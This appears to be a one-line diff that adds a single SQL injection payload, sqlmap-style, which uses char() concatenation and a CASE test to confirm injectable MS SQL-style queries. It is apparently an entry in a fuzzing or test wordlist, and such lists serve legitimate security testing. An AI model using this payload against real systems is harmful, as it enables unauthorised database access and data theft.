@@ -1,0 +1,1 @@
+1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('njge' like 'njge
